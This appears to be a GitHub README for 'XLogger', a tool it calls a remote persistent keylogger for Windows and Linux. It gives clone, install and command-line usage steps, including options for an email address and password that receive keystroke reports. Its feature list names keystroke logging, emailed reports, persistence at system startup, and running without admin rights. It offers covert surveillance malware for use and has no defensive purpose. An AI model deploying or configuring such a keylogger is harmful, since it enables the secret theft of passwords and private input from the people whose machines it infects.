# XLogger
Remote persistent keylogger for Windows and Linux.


## Commands :

### Download
git clone https://github.com/XPR1M3/XLogger.git

### Installation
chmod +x install.sh

./install.sh

### Usage
python xlogger.py

![alt text](https://i.imgur.com/0VLUEu7.jpg)

#### For Windows
python xlogger.py -i [time count in second] -w -e [Email] -p [password] -o [file name]

#### For Linux 
python xlogger.py -i [time count in second] -l -e [Email] -p [password] -o [file name]


### Features:

- Logs keys pressed on keyboard.
- Sends reports by email.
- Starts with system startup.
- Works with Linux and Windows.
- Does not require root or admin privileges.


